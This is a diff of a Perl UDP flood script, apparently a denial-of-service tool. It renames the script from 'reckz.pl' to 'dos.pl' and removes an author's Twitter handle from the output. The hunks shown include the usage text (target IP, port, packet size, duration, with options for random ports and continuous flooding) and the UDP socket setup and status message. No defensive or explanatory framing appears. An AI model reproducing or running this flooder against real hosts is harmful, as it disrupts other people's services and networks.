@@ -4,10 +4,10 @@ use Socket;
 use strict;
  
 if ($#ARGV != 3) {
-  print "reckz.pl <ip> <port> <size> <time>\n\n";
-  print " port=0: use random ports\n";
-  print " size=0: use random size between 64 and 1024\n";
-  print " time=0: continuous flood\n";
+  print "dos.pl <ip> <port> <size> <time>\n\n";
+  print " port=0: Use random ports\n";
+  print " size=0: Use random size between 64 and 1024\n";
+  print " time=0: Continuous flood\n";
   exit(1);
 }
  
@@ -21,7 +21,7 @@ $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
  
-print "twitter.com/Reckz0r - Flooding $ip " . ($port ? $port : "random") . " port with " .
+print "Flooding $ip " . ($port ? $port : "random") . " port with " .
   ($size ? "$size-byte" : "random size") . " packets" .
   ($time ? " for $time seconds" : "") . "\n";
 print "Break with Ctrl-C\n" unless $time;
